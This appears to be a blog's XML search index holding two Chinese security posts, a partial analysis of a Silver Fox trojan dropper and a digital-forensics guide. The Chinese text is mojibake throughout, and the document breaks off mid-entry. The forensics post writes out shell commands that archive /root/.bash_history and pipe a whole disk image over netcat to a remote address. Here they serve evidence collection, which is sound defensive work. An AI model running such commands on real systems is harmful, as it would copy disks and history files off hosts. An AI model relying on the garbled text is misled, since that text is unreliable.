<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä¸€æ¬¡å¤±è´¥çš„é“¶ç‹ç—…æ¯’æ ·æœ¬åˆ†æ</title>
    <link href="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>æ ·æœ¬åŸºæœ¬ä¿¡æ¯ï¼š<br>é“¶ç‹ç»„ç»‡çš„æœ¨é©¬ç—…æ¯’ï¼ˆé“¶ç‹ç—…æ¯’ï¼‰</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-47.png" class="" title="2024-04-03_16-47.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ ·æœ¬çš„ä¸»è¦è¡Œä¸ºæ˜¯ä»ä¸€ä¸ªå¯ç–‘çš„åœ°å€ä¸‹è½½æ–‡ä»¶å¹¶æ‰§è¡Œ</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-49.png" class="" title="2024-04-03_16-49.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>é€šè¿‡å¯¹å…¶ç½‘ç»œè¿æ¥ä»¥åŠæµé‡æŠ“åŒ…å¯çŸ¥ï¼Œè¯¥ç¨‹åºä¸‹è½½äº†5ä¸ªæ–‡ä»¶</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-49.png" class="" title="2024-04-01_16-49.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-48.png" class="" title="2024-04-01_16-48.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>å…¶å®ï¼Œç›´æ¥é€šè¿‡åˆ†æç—…æ¯’æ ·æœ¬ï¼Œä¹Ÿå¯ä»¥å‘ç°è¯¥ä¸‹è½½è¡Œä¸ºï¼Œä»æŒ‡å®šçš„urlå¤„åˆ†åˆ«ä¸‹è½½ä¸€ä¸ªexe,ä¸€ä¸ªdat,ä¸€ä¸ªjpgï¼Œä¸€ä¸ªxml,æ‰€ä»¥è¿™ä¸ªæ‰€è°“çš„â€œè´¢ä¼šäººå‘˜è–ªèµ„è¡¥è´´è°ƒæ•´æ–°æ”¿ç­–æ‰€éœ€ææ–™.exeâ€æ–‡ä»¶å…¶å®ä¸ºä¸ºæœ¨é©¬é‡Šæ”¾å™¨ï¼Œå¹¶éä¸ºç›´æ¥æœ¨é©¬</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_17-27.png" class="" title="2024-04-01_17-27.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_17-05.png" class="" title="2024-04-01_17-05.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>ä¸‹è½½ä¸‹æ¥ä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æï¼Œå…¶ä¸­æ–‡ä»¶2æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå°è¯•è§£å‹å‘ç°éœ€è¦å¯†ç </p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-50.png" class="" title="2024-04-01_16-50.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>ç»§ç»­åˆ†æå…¶ä»–ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶ï¼Œå°è¯•å¯»æ‰¾å‹ç¼©åŒ…å¯†ç ï¼Œåœ¨æ–‡ä»¶1ä¸­å‘ç°äº†upxåŠ å£³</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-48.png" class="" title="2024-04-01_19-48.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>è§£å£³ä¹‹åç»§ç»­è¿›è¡Œåˆ†æï¼ŒåŸæ¥è¿™ä¸ªæ–‡ä»¶1å«tu_rt.exe; æ­¤ç¨‹åºä¸ºç™½æ–‡ä»¶å®é™…æ˜¯NetSarangç³»åˆ—å·¥å…·æ›´æ–°ç¨‹åº</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_13-26.png" class="" title="2024-04-03_13-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>å¹¶ä¸”åœ¨åˆ†æçš„æ—¶ï¼Œé€šè¿‡ä½¿ç”¨å­—ç¬¦ä¸²æœç´¢ï¼Œæœåˆ°ä¸€ä¸ªç±»ä¼¼äºå¯†é’¥çš„æ•°å­—å­—æ¯å­—ç¬¦ä¸²</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-48_1.png" class="" title="2024-04-01_19-48_1.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>å°è¯•æ‹¿å»è¿›è¡Œè§£å‹å‹ç¼©åŒ…ï¼ŒæˆåŠŸè§£å‹</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-49.png" class="" title="2024-04-01_19-49.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>é€šè¿‡stringsè¯»å–_TUProj.datï¼Œå‘ç°å¼€å¤´æ’å…¥äº†ç—…æ¯’è„šæœ¬ï¼Œä¸è¿‡daté‡Œé¢çš„shellcodeçœ‹ä¸æ‡‚æ˜¯å¹²å•¥çš„ å°±æ²¡å†å¾€ä¸‹åˆ†æ</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-53.png" class="" title="2024-04-01_19-53.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-56.png" class="" title="2024-04-01_19-56.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>å›å½’åˆ°ç—…æ¯’æœ¬èº«ï¼Œç¨‹åºè¿è¡Œåä¼šæ£€æµ‹360ç¨‹åºï¼Œæœ‰360ç¨‹åºåˆ™ä¼šå¼¹æ¡†ï¼Œå¹¶é€€å‡ºç¨‹åºæ‰§è¡Œ</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_15-50.png" class="" title="2024-04-01_15-50.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_17-44.png" class="" title="2024-04-03_17-44.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>å› ä¸ºæŠ€æœ¯å¤ªèœï¼Œexeé™æ€åˆ†æåˆ†æä¸åŠ¨äº†ï¼Œå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥æŒ‡ç‚¹ä¸€ä¸‹å°å¼Ÿï¼Œæ¯•ç«Ÿå°å¼Ÿåªæ˜¯ç»ƒä¹ ä¸¤å¹´åŠçš„å®ä¹ ç”ŸğŸ˜«</p><p>ä¸‹é¢å°±æ°´ä¸€ä¸‹å‡‘å‡‘æ•°å§ï¼Œç—…æ¯’å¸¦çš„ä¸€äº›icoå’Œè¡Œä¸ºäº¤äº’</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-15_1.png" class="" title="2024-04-03_16-15_1.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-15.png" class="" title="2024-04-03_16-15.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-25.png" class="" title="2024-04-03_16-25.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>end.</p>]]></content>
    
    
    <categories>
      
      <category>é€†å‘å·¥ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ·æœ¬åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å–è¯é—²è°ˆ</title>
    <link href="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/"/>
    <url>/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èŠåˆ°å–è¯ï¼Œå¯ä»¥åˆ†ä¸ºæ´»å–è¯å’Œæ­»å–è¯ï¼Œæˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„æ´»å–è¯æ˜¯æŒ‡åœ¨ä¸»æœºå­˜æ´»æ—¶å‘ç°ç³»ç»Ÿè¢«å…¥ä¾µ,ç›´æ¥å¿«é€Ÿçš„æŠŠæœºå™¨çš„è¿è¡Œå†…å­˜dumpä¸‹æ¥ï¼Œå¯¹è¿è¡Œå†…å­˜è¿›è¡Œåˆ†æå–è¯ï¼Œæ‰‹æœºçŠ¯ç½ªè¯æ®ï¼›è€Œæ­»å–è¯é€šå¸¸æ˜¯æŒ‡å¯¹æœºå™¨çš„ç£ç›˜åšé•œåƒä¹‹ååˆ†æçš„å–è¯æ–¹æ³•ï¼Œç”¨äºåœ¨å…³æœºååˆ¶ä½œç¡¬ç›˜é•œåƒ,é€šè¿‡åˆ†æé•œåƒæ¥åšå–è¯å·¥ä½œï¼Œç›¸æ¯”äºæ­»å–è¯,æ´»å–è¯æ˜¯æ›´åŠ çš„é‡è¦,èƒ½å¤Ÿè·å–åˆ°å½“å‰ç³»ç»Ÿç¬¬ä¸€æ‰‹èµ„æ–™ä¸è¯æ®,å¯¹äºæ•´ä¸ªæ¡ˆä»¶èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåœ¨æ¡ˆä»¶ç°åœºä¸­ï¼Œå¤§å¤šæ•°è¿˜æ˜¯windowsç³»ç»Ÿçš„æ™®é€šæœºå™¨ï¼Œä¸è®ºæ˜¯ä¸ªäººç¬”è®°æœ¬è¿˜æ˜¯åŠå…¬æœºæˆ¿ä¸»æœºç­‰ç­‰ï¼Œä½†æ˜¯æ¶‰æ¡ˆå¦‚æœæ˜¯æœåŠ¡å™¨ï¼Œåˆ™å¤§å¤šæ•°å¯èƒ½ä»¥linuxç³»ç»Ÿä¸ºä¸»ï¼Œå¹¶ä¸”å¦‚æœç°åœºæ¶‰æ¡ˆæœºå™¨æ˜¯å…³æœºçŠ¶æ€ä¸‹ç›´æ¥åšç£ç›˜é•œåƒç­‰æ“ä½œå°±å¯ä»¥ï¼Œä½†å¦‚æœæ˜¯å¼€æœºçŠ¶æ€ä¸‹ï¼Œåœ¨ä¿æŠ¤ç°åœºçš„æƒ…å†µä¸‹ï¼Œè¿˜è¦è€ƒè™‘æå–ç³»ç»Ÿçš„ç½‘ç»œã€è¿›ç¨‹ç­‰æ•°æ®ï¼Œä»¥åŠåˆ¶ä½œå†…å­˜é•œåƒç­‰æ“ä½œ</p><h2 id="LinuxæœåŠ¡å™¨å–è¯"><a href="#LinuxæœåŠ¡å™¨å–è¯" class="headerlink" title="LinuxæœåŠ¡å™¨å–è¯"></a>LinuxæœåŠ¡å™¨å–è¯</h2><p>é¦–å…ˆéœ€è¦æå–ç³»ç»Ÿçš„ç½‘ç»œï¼Œè¿›ç¨‹ï¼Œæ—¥å¿—ç­‰æ•°æ®</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æå–æ‰€æœ‰çš„IPv4ã€v6æ•°æ®ï¼šlsof -i&gt;lsof-<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.txt</span><br>æå–æ‰€æœ‰çš„è¿›ç¨‹æ•°æ®ï¼šlsof -K&gt;lsof-K<span class="hljs-selector-class">.txt</span><br>æˆªè·å½“å‰æ­£åœ¨è¿è¡Œçš„æœºå™¨<span class="hljs-number">1000</span>å¸§ï¼ˆæ ¹æ®å®é™…æƒ…å†µè€Œå®šï¼‰æ•°æ®åŒ…ï¼štcpdump -<span class="hljs-selector-tag">i</span> any -c <span class="hljs-number">1000</span> -w capture01.cap<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203116.png" class="" title="2024-03-24-203116.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-37.png" class="" title="2024-03-25_10-37.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-38.png" class="" title="2024-03-25_10-38.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æ‰“åŒ…/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>ä¸‹çš„æ‰€æœ‰æ•°æ®ï¼štar -zcPf <span class="hljs-keyword">var</span>-<span class="hljs-built_in">log</span>.tar /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ‰“åŒ…rootç”¨æˆ·ï¼štar -zcPf bash-history.tar /root/.bash_history</span><br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203321.png" class="" title="2024-03-24-203321.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>ç„¶åéœ€è¦é‡‡é›†è®¾å¤‡çš„å†…å­˜é•œåƒï¼Œå¦‚æœæ˜¯CentOS,Red Hatç³»åˆ—çš„Linuxç³»ç»Ÿï¼Œæ¨èä½¿ç”¨LiMEï¼Œå®ƒæ˜¯æ˜¯ä¸€ç§å¯åŠ è½½çš„å†…æ ¸æ¨¡å—ï¼ˆLKMï¼‰ï¼Œå¦‚æœæ˜¯Debianå’ŒUbuntuç³»åˆ—çš„Linuxç³»ç»Ÿï¼Œæ¨èä½¿ç”¨fmem<br>LiMEä¸‹è½½åœ°å€ï¼š<a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a><br>fmemä¸‹è½½åœ°å€ï¼š<a href="https://github.com/NateBrune/fmem">https://github.com/NateBrune/fmem</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203510.png" class="" title="2024-03-24-203510.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-46.png" class="" title="2024-03-25_11-46.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>æœ€ååˆ¶ä½œè®¾å¤‡çš„ç£ç›˜é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ddè¿›è¡Œåˆ¶ä½œï¼Œä¸è¿‡ddåªèƒ½åšrawæ ¼å¼çš„é•œåƒæ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦è€ƒè™‘ç£ç›˜çš„å‰©ä½™ç©ºé—´ï¼Œå¦‚æœç©ºé—´ä¸è¶³å¯ä»¥ä¿å­˜åˆ°å¤–ç½®çš„USBè®¾å¤‡é‡Œé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">1ã€æœ¬åœ°å–æ•°æ®<br><br>fdisk -l    <span class="hljs-comment"># æŸ¥çœ‹ç£ç›˜åŠåˆ†åŒº</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=éœ€è¦æ‹·è´çš„ç£ç›˜ of=/å­˜å‚¨ç›®å½•/é•œåƒæ–‡ä»¶ ï¼ˆç¡®ä¿å­˜å‚¨ç›®å½•æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼‰ <span class="hljs-comment"># è·å–æ•´ä¸ªç£ç›˜é•œåƒæ–‡ä»¶</span><br><br>2ã€è¿œç¨‹å–ç¡¬ç›˜æ•°æ®<br><br><span class="hljs-comment"># å–è¯æœºå™¨ B ä¸Šè¿è¡Œ</span><br>nc -l -p 4445 | <span class="hljs-built_in">dd</span> of=/tmp/sda2.<span class="hljs-built_in">dd</span><br><br><span class="hljs-comment"># å—å®³æœºå™¨ A ä¸Šæ‰§è¡Œä¼ è¾“ï¼Œå³å¯å®Œæˆä»å—å®³æœºå™¨ A å…‹éš† sda ç¡¬ç›˜åˆ°å–è¯æœºå™¨ B çš„ä»»åŠ¡ï¼š</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda2 | nc 192.168.10.11 4445<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25-125841.png" class="" title="2024-03-25-125841.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ftkimagerï¼Œå¯ä»¥åˆ¶ä½œDDå’ŒE01æ ¼å¼çš„é•œåƒæ–‡ä»¶<br>å·¥å…·ä¸‹è½½åœ°å€<a href="https://accessdata.com/product-download">https://accessdata.com/product-download</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_13-01.png" class="" title="2024-03-25_13-01.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><h2 id="å†…å­˜å–è¯"><a href="#å†…å­˜å–è¯" class="headerlink" title="å†…å­˜å–è¯"></a>å†…å­˜å–è¯</h2><p>æ¥ä¸‹æ¥èŠèŠå†…å­˜å–è¯ï¼Œè·å–åˆ°ç‰©ç†å†…å­˜ä¹‹å,æ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯è¦å¯¹é•œåƒæ–‡ä»¶è¿›è¡Œå–è¯åˆ†æï¼Œä»ä¸­æå–æœ‰ç”¨çš„è¯æ®ï¼Œå¸¸ä½¿ç”¨çš„å·¥å…·æ˜¯Volatilityï¼ŒVolatilityæ˜¯ä¸€æ¬¾å¼€æºçš„ï¼Œå¹¶ä¸”åŸºäºPythonå¼€å‘çš„å†…å­˜å–è¯å·¥å…·é›†ï¼Œå¯ä»¥åˆ†æå†…å­˜ä¸­çš„å„ç§æ•°æ®ï¼ŒVolatilityæ”¯æŒå¯¹32ä½æˆ–64ä½Wnidowsã€Linuxã€Macã€Androidæ“ä½œç³»ç»Ÿçš„RAMæ•°æ®è¿›è¡Œæå–ä¸åˆ†æï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤å‚æ•°</p><p>imageinfoï¼šè¯†åˆ«æ“ä½œç³»ç»Ÿã€æœåŠ¡åŒ…ä»¥åŠç¡¬ä»¶æ¶æ„ï¼ˆ32ä½æˆ–64ä½ï¼‰ï¼Œå¹¶ä¸”è¿˜èƒ½æ”¶é›†DTBåœ°å€å’Œæ ·æœ¬æ”¶é›†çš„æ—¶é—´ç­‰</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-01.png" class="" title="2024-03-25_14-01.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>kpcrscanï¼šæ‰«ææ½œåœ¨çš„KPCRï¼ˆå†…æ ¸è¿›ç¨‹æ§åˆ¶åŒºåŸŸï¼‰ç»“æ„ï¼Œåœ¨å¤šæ ¸ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªå¤„ç†å™¨éƒ½æœ‰è‡ªå·±çš„KPCRï¼Œæ‰€ä»¥é€šè¿‡kpcrscanï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªå¤„ç†å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬IDTï¼ˆä¸­æ–­æè¿°ç¬¦è¡¨ï¼‰å’ŒGDTï¼ˆå…¨å±€æè¿°ç¬¦è¡¨ï¼‰åœ°å€ï¼›ä»¥åŠå½“å‰ã€ç©ºé—²å’Œä¸‹ä¸€ä¸ªçº¿ç¨‹ï¼›CPUç¼–å·ã€ä¾›åº”å•†å’Œé€Ÿåº¦ï¼›ä»¥åŠCR3å€¼ç­‰ç­‰</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-25.png" class="" title="2024-03-25_14-25.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>pslistï¼šå¯ä»¥æå–ç³»ç»Ÿä¸­çš„è¿›ç¨‹ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šéå†ç”± PsActiveProcessHeadæŒ‡å‘çš„åŒå‘é“¾è¡¨ï¼Œå¹¶æ˜¾ç¤ºè¿›ç¨‹çš„åç§»é‡ã€è¿›ç¨‹åç§°ã€è¿›ç¨‹IDã€çˆ¶è¿›ç¨‹IDã€çº¿ç¨‹æ•°é‡ã€å¥æŸ„æ•°é‡ä»¥åŠè¿›ç¨‹å¯åŠ¨å’Œé€€å‡ºçš„æ—¥æœŸ&#x2F;æ—¶é—´ç­‰</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-28.png" class="" title="2024-03-25_14-28.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>psscanï¼šå¯ä»¥æšä¸¾è¿›ç¨‹ï¼Œä¸è¿‡å’Œpslistç›¸æ¯”ï¼Œå¯ä»¥æ‰¾åˆ°ä¹‹å‰å·²ç»ˆæ­¢ï¼ˆéæ´»åŠ¨ï¼‰çš„è¿›ç¨‹ä»¥åŠè¢«rootkitéšè—æˆ–è§£é™¤é“¾æ¥çš„è¿›ç¨‹</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-29.png" class="" title="2024-03-25_14-29.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>dlllistï¼šæå–è¿›ç¨‹åŠ è½½çš„DLLåˆ—è¡¨</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-31.png" class="" title="2024-03-25_14-31.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>getsidsï¼šå¯ä»¥æŸ¥çœ‹ä¸è¿›ç¨‹å…³è”çš„SIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰ï¼Œå¯ä»¥å¸®åŠ©è¯†åˆ«æ¶æ„æå‡æƒé™çš„è¿›ç¨‹ä»¥åŠå±äºç‰¹å®šç”¨æˆ·çš„è¿›ç¨‹</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-33.png" class="" title="2024-03-25_14-33.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>cmdscanï¼šç”¨äºäº†è§£æ”»å‡»è€…åœ¨å—å®³è€…ç³»ç»Ÿä¸Šçš„è¡Œä¸º</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-34.png" class="" title="2024-03-25_14-34.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>consolesï¼šç”¨äºæŸ¥æ‰¾æ”»å‡»è€…åœ¨cmd.exeä¸­è¾“å…¥æˆ–é€šè¿‡åé—¨æ‰§è¡Œçš„å‘½ä»¤ï¼Œç›¸æ¯”äºcmdscanï¼Œä¸ä»…æ‰“å°å‡ºæ”»å‡»è€…è¾“å…¥çš„å‘½ä»¤ï¼Œè¿˜å¯ä»¥æ”¶é›†æ•´ä¸ªå±å¹•ç¼“å†²åŒºï¼ˆè¾“å…¥å’Œè¾“å‡ºï¼‰</p><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>modscanï¼šå¯ä»¥æ‰«æç‰©ç†å†…å­˜ä¸­çš„æ± æ ‡è®°æ¥æŸ¥æ‰¾ LDR_DATA_TABLE_ENTRYç»“æ„ï¼Œæœ‰åŠ©äºæ•è·ä¹‹å‰å¸è½½çš„é©±åŠ¨ç¨‹åºä»¥åŠè¢«rootkitséšè—&#x2F;è§£é™¤é“¾æ¥çš„é©±åŠ¨ç¨‹åº</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-42.png" class="" title="2024-03-25_14-42.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>filescanï¼šç”¨äºæŸ¥æ‰¾æ–‡ä»¶</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-44.png" class="" title="2024-03-25_14-44.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>connectionsï¼šå¯ä»¥æŸ¥çœ‹åœ¨å†…å­˜è·å–æ—¶å¤„äºæ´»åŠ¨çŠ¶æ€çš„TCPè¿æ¥</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-45.png" class="" title="2024-03-25_14-45.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>hivescanï¼šæŸ¥æ‰¾å†…å­˜ä¸­æ³¨å†Œè¡¨æ–‡ä»¶çš„ç‰©ç†åœ°å€</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-47.png" class="" title="2024-03-25_14-47.png"><h6 id="-19"><a href="#-19" class="headerlink" 